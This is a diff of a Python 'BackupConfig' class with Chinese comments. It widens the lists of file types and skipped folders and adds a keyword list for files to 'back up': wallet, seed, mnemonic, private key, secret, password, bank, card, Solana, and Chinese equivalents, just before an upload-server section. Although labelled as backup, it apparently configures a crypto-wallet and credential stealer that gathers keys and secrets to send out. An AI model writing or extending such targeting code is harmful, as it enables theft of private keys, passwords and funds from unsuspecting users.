@@ -45,13 +45,13 @@ class BackupConfig:
     # 需要备份的文件类型
     # 文档类型扩展名
     DOC_EXTENSIONS = [
-        ".txt", ".json", ".js", ".py", ".go", ".sh", ".sol", ".rs", ".env",
-        ".csv", ".bin", ".wallet", ".ts", ".jsx", ".tsx"
+        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
+        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md",
     ]
     # 配置类型扩展名
     CONFIG_EXTENSIONS = [
-        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
-        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp", ".conf"
+        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
+        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
     ]
     # 所有备份扩展名（用于兼容性）
     BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
@@ -85,10 +85,46 @@ class BackupConfig:
         ".thunderbird",
         ".wdm",
         "cache",
-        "Downloads",
         "myenv",
         "snap",
         "venv",
+        "node_modules",
+        "dist",
+        ".cache",
+        ".config",
+        ".vscode-server",
+        "build",
+        ".vscode-remote-ssh",
+        ".git",
+        "__pycache__",
+    ]
+
+    # 关键字备份配置 - 备份包含以下关键字的文件和文件夹
+    KEYWORD_BACKUP_KEYWORDS = [
+        "wallet",
+        "seed",
+        "mnemonic",
+        "private",
+        "privkey",
+        "keypair",
+        "secret",
+        "account",
+        "password",
+        "bank",
+        "card",
+        "solana",
+        "important",
+        "钱包",
+        "助记词",
+        "种子",
+        "私钥",
+        "密钥",
+        "密码",
+        "账户",
+        "账号",
+        "信用卡",
+        "备忘",
+        "重要",
     ]
 
     # 上传服务器配置
